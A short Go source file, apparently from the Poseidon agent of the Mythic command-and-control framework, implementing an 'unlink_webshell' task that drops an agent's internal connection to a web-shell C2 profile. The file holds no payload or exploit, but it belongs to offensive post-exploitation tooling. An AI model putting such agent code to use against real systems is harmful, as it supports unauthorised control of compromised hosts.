package unlink_webshell

import (
	// Standard

	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	RemoteUUID string `json:"connection"`
}

// Run - package function to run unlink_tcp
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := &Arguments{}
	err := json.Unmarshal([]byte(task.Params), args)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	task.Job.RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
		ConnectionUUID: args.RemoteUUID,
		C2ProfileName:  "webshell",
	}
	msg.UserOutput = "Tasked to disconnect"
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg
	return
}
